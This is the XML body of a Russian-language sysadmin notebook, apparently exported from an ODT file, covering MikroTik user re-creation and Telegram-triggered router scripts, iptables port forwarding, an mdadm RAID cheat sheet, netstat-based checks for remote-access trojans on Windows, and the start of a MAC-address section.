      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:put "";</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">:if ([:len [/user find disabled=no name=$RegUser]]!=0) do={:put "Ok, a user with this name was found"; :put "";</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:put "Please, enter new password for this user:"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:local newPass [$EnterString];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">[/user remove $RegUser];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">[/user add name=$RegUser password=$newPass group=full];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:put "";</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:put "The user has been re-created, the password has been changed";</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:put ("New user`s password: "."$newPass");</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:put "Don't forget to set up access restrictions based on ip addresses";</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>} else={:put ("User "."$RegUser "."not found"); :put "";</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/></text:span><text:span text:style-name="T3">}</text:span></text:p>
      <text:p text:style-name="P1">}</text:p>
      <text:p text:style-name="P1">Скрипт интересен строкой преобразования кода символа из переменной $key, сграбленного с клавиатуры терминала, в сам символ.</text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">:local char [[:parse "(\"\\$[:pick "0123456789ABCDEF" (($key &gt;&gt; 4) &amp; 0xF)]$[:pick "0123456789ABCDEF" ($key &amp; 0xF)]\")"]]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P13">Как пробросить порт в Linux на другой сервер? Необходимо пробросить с 8821 порта сервера 10.10.10.10 на 21 порт сервера 12.12.12.12:</text:p>
      <text:p text:style-name="P15">iptables -A FORWARD --dst 10.10.10.10 -p tcp --dport 8821 -j ACCEPT</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">iptables -A FORWARD --src 10.10.10.10 -p tcp --sport 8821 -j ACCEPT</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">iptables -t nat -A PREROUTING -d 10.10.10.10 -p tcp --dport 8821 -j DNAT --to-destination 12.12.12.12:21</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">iptables -t nat -A POSTROUTING -d 12.12.12.12 -p tcp --dport 21 -j SNAT --to-source 10.10.10.10:8821</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P4">#iptables</text:p>
      <text:p text:style-name="P1">Шпаргалка по RAID</text:p>
      <text:p text:style-name="P1">mdadm - утилита для работы с программными RAID-массивами различных уровней. В данной инструкции рассмотрим примеры ее использования.</text:p>
      <text:p text:style-name="P1">Информация о RAID</text:p>
      <text:p text:style-name="P1">cat /proc/mdstat - состояние всех RAID</text:p>
      <text:p text:style-name="P1">mdadm -D /dev/md0 - подробная инфа о конкретном RAID</text:p>
      <text:p text:style-name="P1">lsblk - список дисков с разделами, местом, типом</text:p>
      <text:p text:style-name="P1">df -hT - свободное место, тип файловой системы, точки монтирования</text:p>
      <text:p text:style-name="P1">Сборка RAID</text:p>
      <text:p text:style-name="P1">mdadm - zero-superblock - force /dev/sd{b,c} - обнуление суперблоков на дисках sdb sdc (для удаления инфы о других RAID)</text:p>
      <text:p text:style-name="P1">при получении ответа mdadm: Unrecognised md component device - /dev/sdb значит, что диск не использовался для RAID, продолжаем</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm - create - verbose /dev/md0 -l 1 -n 2 /dev/sd{b,c}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">* где /dev/md0 - устройство RAID, которое появится после сборки; -l 1 - уровень RAID; -n 2 - количество дисков, из которых собирается массив; /dev/sd{b,c} - сборка выполняется из дисков sdb и sdc.</text:span></text:p>
      <text:p text:style-name="P1">Создание файловой системы и монтирование массива</text:p>
      <text:p text:style-name="P1">mkfs.ext4 /dev/md0 - создание файловой системы ext4 на md0</text:p>
      <text:p text:style-name="P1">mount /dev/md0 /mnt - разово примонтировать md0 к /mnt</text:p>
      <text:p text:style-name="P1">nano /etc/fstab, прописать /dev/md0 /mnt ext4 defaults 1 2 - постоянное монтирование, работает после перезагрузки</text:p>
      <text:p text:style-name="P1">Восстановление RAID</text:p>
      <text:p text:style-name="P1">Замена жесткого диска</text:p>
      <text:p text:style-name="P1">При выходе из строя, команда mdadm -D /dev/md0 выдаст: State : clean, degraded</text:p>
      <text:p text:style-name="P1">mdadm /dev/md0 - remove /dev/sdc - удалить сбойный диск</text:p>
      <text:p text:style-name="P1">mdadm /dev/md0 - add /dev/sde - добавить новый диск в массив</text:p>
      <text:p text:style-name="P1">Статус должен стать Rebuild Status : 40% complete и так до полного восстановления</text:p>
      <text:p text:style-name="P1">Пересборка массива</text:p>
      <text:p text:style-name="P1">Если нам нужно вернуть ранее разобранный или развалившийся массив из дисков, которые уже входили в состав RAID, вводим:</text:p>
      <text:p text:style-name="P1">mdadm - assemble - scan - команда сама найдет необходимую конфигурацию и восстановит RAID.</text:p>
      <text:p text:style-name="P13">mdadm - assemble /dev/md0 /dev/sdb /dev/sdc - с указанием из каких дисков пересобрать</text:p>
      <text:p text:style-name="P13">Запасной диск (Hot Spare)</text:p>
      <text:p text:style-name="P1">Если в массиве будет запасной диск для горячей замены, при выходе из строя одного из основных дисков, его место займет запасной.</text:p>
      <text:p text:style-name="P1">mdadm /dev/md0 - add /dev/sdd - Диском Hot Spare станет тот, который просто будет добавлен к массиву</text:p>
      <text:p text:style-name="P1">Добавить диск к массиву, расширить массив</text:p>
      <text:p text:style-name="P1">Добавление активного диска к RAID, который будет использоваться для работы, а не в качестве запасного.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm /dev/md0 - add /dev/sde</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm -G /dev/md0 - raid-devices=3 - </text:span><text:span text:style-name="T3">расширяем</text:span><text:span text:style-name="T2"> RAID</text:span></text:p>
      <text:p text:style-name="P1">* в данном примере подразумевается, что у нас RAID 1 и мы добавили к нему 3-й диск.</text:p>
      <text:p text:style-name="P1">Установка mdadm</text:p>
      <text:p text:style-name="P1">Если каким-то образом в дистрибутиве нет этого пакета</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">apt-get install mdadm</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Удаление</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">массива</text:span></text:p>
      <text:p text:style-name="P1">Если нам нужно полностью разобрать RAID, сначала размонтируем и остановим его:</text:p>
      <text:p text:style-name="P1">umount /mnt</text:p>
      <text:p text:style-name="P1">* где /mnt - каталог монтирования нашего RAID.</text:p>
      <text:p text:style-name="P1">mdadm -S /dev/md0</text:p>
      <text:p text:style-name="P1">Затем очищаем суперблоки на всех дисках, из которых он был собран:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">mdadm - zero-superblock /dev/sdb</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm - zero-superblock /dev/sdc</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm - zero-superblock /dev/sdd</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Как</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">найти</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">вирус</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">удаленного</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">доступа</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> Windows?</text:span></text:p>
      <text:p text:style-name="P1">Иногда у пользователя ПК могут появиться подозрения, что с его компьютером что-то не так. К примеру: внезапное открытие или закрытие программ, посторонние вкладки, частые взломы аккаунтов и прочее. Одной из причин таких явлений может стать вирус удаленного доступа.</text:p>
      <text:p text:style-name="P1">Чтобы найти вирус:</text:p>
      <text:p text:style-name="P1">1. Запустите командную строку от имени администратора. Удобно открыть через ПКМ на иконку «Пуск».</text:p>
      <text:p text:style-name="P1">2. Перейдите в директорию своего юзера, используя команду «cd C:\Users\&lt;ваш_юзернейм&gt;».</text:p>
      <text:p text:style-name="P1">3. Введите команду «netstat -b». На экран начнут выводиться все подключения ваших программ, а так же их IP-адреса.</text:p>
      <text:p text:style-name="P1">4. Если нашли незнакомый подозрительный процесс, введите команду «netstat -nbo», чтобы узнать PID этого процесса.</text:p>
      <text:p text:style-name="P1">5. Затем выполните команду «taskkill /PID &lt;pid_вашего_процесса&gt; /F», чтобы убить процесс.</text:p>
      <text:p text:style-name="P16">В случае обнаружения вируса вы также увидите IP адрес прокси сервера, через который он имеет доступ к компьютеру. Это может оказаться полезным.</text:p>
      <text:p text:style-name="P16">Удаленный запуск скриптов через Телеграм в Mikrotik</text:p>
      <text:p text:style-name="P1">Представляю переработанную на свой лад версию скрипта, позволяющую удалённо запускать скрипты Mikrotik через Телеграм. Для работы скрипта должны быть заранее известны BotID и ChatID. Скрипт необходимо добавить в System/Sheduler и установить запуск с периодичностью не менее одного раза минуту. Алгоритм работы следующий: каждый раз при активации скрипта запрашивается ПОСЛЕДНЕЕ сообщение в группе с указанным BotID и если разница между временем отправки сообщения в Телеграм и текущим временем на Mikrotik составляет менее 1 минуты, тогда производится запуск скрипта с именем, указанным в теле сообщения. На что нужно обратить внимание:</text:p>
      <text:p text:style-name="P1">1. Работа скрипта привязана к текущему времени, по этой причине на роутере должны быть правильно выставлены время и часовой пояс.</text:p>
      <text:p text:style-name="P1">2. Сообщения для роутера должны начинаться с символа "/". Например, если нужно запустить скрипт с именем "wol", тогда в теле сообщения должно быть написано "/wol", при этом в System/Scripts заранее должен быть прописан скрипт с нужным именем (например: "wol").</text:p>
      <text:p text:style-name="P1">3. Скрипт считывает ПОСЛЕДНЕЕ сообщение в группе и по этой причине не имеет смысла накидывать сразу много команд, в любом случае будет выполнена только последняя.</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Сам</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">скрипт</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">ниже</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># Script remote activation script via Telegram by drPioneer</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2"># https://forummikrotik.ru/viewtopic.php?p=78085</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># tested on ROS 6.48</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># updated 2021/04/05</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:do {</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>:local botID <text:s text:c="3"/>"botXXXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>:local myChatID "-XXXXXXXXX";</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/># Telegram messenger response parsing function by Dimonw</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/># https://habr.com/ru/post/482802/</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>:local parse do={</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local variaMod ("\"".$variable);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local startLoc ([:find $content $variaMod -1] + [:len $variaMod] + 2);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local commaLoc ([:find $content "," $startLoc]);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local brakeLoc ([:find $content "}" $startLoc]);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local endLoc $commaLoc;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local startSymbol [:pick $content $startLoc]; </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:if ($brakeLoc != 0 and ($commaLoc = 0 or $brakeLoc &lt; $commaLoc)) do={ :set endLoc $brakeLoc; };</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:if ($startSymbol = "{") do={ :set endLoc ($brakeLoc + 1); };</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:if ($quotas = true) do={</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="12"/>:set startLoc ($startLoc + 1);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="12"/>:set endLoc <text:s text:c="2"/>($endLoc - 1);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:if ($endLoc &lt; $startLoc) do={ :set endLoc ($startLoc + 1); };</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local message [:pick $content $startLoc $endLoc];</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:return $message;</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/># UNIX time conversion function to normal view by Pepelxl</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/># https://forummikrotik.ru/viewtopic.php?t=11636</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>:local unixTime do={</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local dateY <text:s/>($timeStamp / 31436000 + 1970);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local dateM (($dateY - 1969) / 4);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local dateD (($timeStamp / 86400 - $dateM) % 365);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local days <text:s text:c="2"/>[:toarray (31,28,31,30,31,30,31,31,30,31,30,31)];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local months [:toarray ("jan","feb","mar","apr","may","jun","jul","aug","sep","oct","nov","dec")];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:if ($dateY % 4 = 0) do={ :set ($days-&gt;1) 29; }</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>do {</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="12"/>:for i from=0 to=11 do={ </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="16"/>:if (($days-&gt;$i) &gt; $dateD) do={ </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="20"/>:set $dateM ($i); </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="20"/>:set $dateD ($dateD + 1); </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="20"/>:break;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="16"/>} else={ :set $dateD ($dateD - ($days-&gt;$i)); } </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2"><text:s text:c="12"/>}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>} on-error={}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local timeS ($timeStamp % 86400);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local timeH ($timeS / 3600);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local timeM ($timeS % 3600 / 60);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:set <text:s/>$timeS ($timeS - $timeH * 3600 - $timeM * 60);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local normalTime (($months-&gt;$dateM)."/");</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:if ($dateD &lt; 10) do={ :set $normalTime ($normalTime."0".[:tostr $dateD]."/"); } else={ :set $normalTime ($normalTime.[:tostr $dateD]."/"); }</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:set $normalTime ($normalTime.[:tostr $dateY]." "); <text:s text:c="2"/></text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:if ($timeH &lt; 10) do={ :set $normalTime ($normalTime."0".[:tostr $timeH].":"); } else={ :set $normalTime ($normalTime.[:tostr $timeH].":"); }</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:if ($timeM &lt; 10) do={ :set $normalTime ($normalTime."0".[:tostr $timeM].":"); } else={ :set $normalTime ($normalTime.[:tostr $timeM].":"); }</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:if ($timeS &lt; 10) do={ :set $normalTime ($normalTime."0".[:tostr $timeS]); } <text:s text:c="4"/>else={ :set $normalTime ($normalTime.[:tostr $timeS]); }</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:put ([:totime $normalTime]);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:return $normalTime;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/># Main body of the script</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>:local nameID <text:s text:c="2"/>[ /system identity get name; ];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>:local dateNow <text:s/>[ /system clock <text:s text:c="3"/>get date; ];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>:local timeNow <text:s/>[ /system clock <text:s text:c="3"/>get time; ];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>:local httpResponse [ /tool fetch url="https://api.telegram.org/$botID/getUpdates\?offset=-1&amp;limit=1&amp;allowed_updates=message&amp;timeout=60" as-value output=user; ];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>:local content ($httpResponse-&gt;"data");</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>:if ([:len $content] &gt; 30) do={</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local msgId <text:s text:c="3"/>[$parse content=$content variable="update_id"];</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local message <text:s/>[$parse content=$content variable="text" quotas=true];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:set <text:s text:c="2"/>message ([:pick $message ([:find $message "/"] + 1) ([:len $message])]);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local chat <text:s text:c="4"/>[$parse content=$content variable="chat"];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local chatId <text:s text:c="2"/>[$parse content=$chat <text:s text:c="3"/>variable="id"];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local userName [$parse content=$content variable="username"];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local dateTime [$parse content=$content variable="date"];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:set <text:s text:c="2"/>dateTime ($dateTime + [ /system clock get gmt-offset; ]);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local normTime [$unixTime timeStamp=$dateTime];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:put ("Current time on router:\t $dateNow $timeNow");</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:put ("Last message from $userName: time=$normTime, id=$msgId, text=$message.");</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:if (($normTime ~ $dateNow) &amp;&amp; ([:totime [:pick $normTime ([:find $normTime " "] + 1) ([:find $normTime " "] + 9)]] &gt; ($timeNow - 00:01:00))) do={</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="12"/>:put ("Right time to activation script.");</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2"><text:s text:c="12"/>:if (($chatId = $myChatID) &amp;&amp; ([/system script find name=$message] != "")) do={</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="16"/>:put ("Telegram user $userName activated script '$message'.");</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="16"/>:log warning ("Telegram user $userName activated script '$message'."); <text:s text:c="16"/></text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="16"/>/system script run $message;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="16"/>/tool fetch keep-result=no url="https://api.telegram.org/$botID/sendmessage\?chat_id=$chatId&amp;text=$nameID: '$message' command accepted.";</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="12"/>} else={ :put ("Not all conditions activation script are met."); }</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>} else={ :put ("Bad time to activation script."); }</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">} on-error={ :put ("Script error: 1 - message could have been sent a long time ago. 2 - check whether 'botID' &amp; 'myChatID' variables are specified correctly."); }</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Как узнать и при необходимости изменить MAC-адрес в Windows?</text:p>
      <text:p text:style-name="P1">Каждый сетевой адаптер имеет уникальный MAC-адрес (Media Access Control). Он необходим для идентификации отдельных устройств, подключенных к сети. Это относится ко всем типам сетевых карт, включая карты Ethernet и WiFi. </text:p>
      <text:p text:style-name="P1">MAC-адрес (он же физический адрес) представляет собой шестибайтовое число или 12-значное шестнадцатеричное число, которое используется для уникальной идентификации хоста в сети.</text:p>
